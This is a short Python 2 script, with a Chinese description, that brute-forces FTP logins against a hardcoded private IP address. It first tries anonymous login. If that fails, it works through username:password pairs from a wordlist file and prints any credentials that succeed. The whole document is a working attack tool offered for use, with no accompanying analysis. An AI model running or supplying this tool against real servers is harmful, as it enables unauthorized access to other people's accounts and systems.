#coding: utf-8
'''
Author:
       __  _             ________
 ___ _/ /_(_)__ ____ ___/_  /_  /
/ _ `/ __/ / _ `/ -_) __// / / /
\_,_/\__/_/\_, /\__/_/  /_/ /_/
          /___/
Date:20170202
Desc:爆破ftp服务密码，先判断ftp是否开启匿名，如果没有则开始爆破。

'''

import ftplib


def burteLogin(hostname):
    pf = open('FTPpass_list.txt','r')
    for line in pf.readlines():
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n') 
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username,password)
            print '[*] ' + str(hostname) + 'FTP Login Succeeded: ' + username + '/' + password
            ftp.quit()
            return(username,password)
        except Exception,e:
            pass
    print '[-] Could not brute foce FTP credentials'

def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous')
        print '[*] ' + str(hostname) + ' FTP Anonymous Login Succeeded.'
        ftp.quit()
        return True
    except Exception,e:
        burteLogin(hostname)

host = '172.16.56.132'
anonLogin(host)
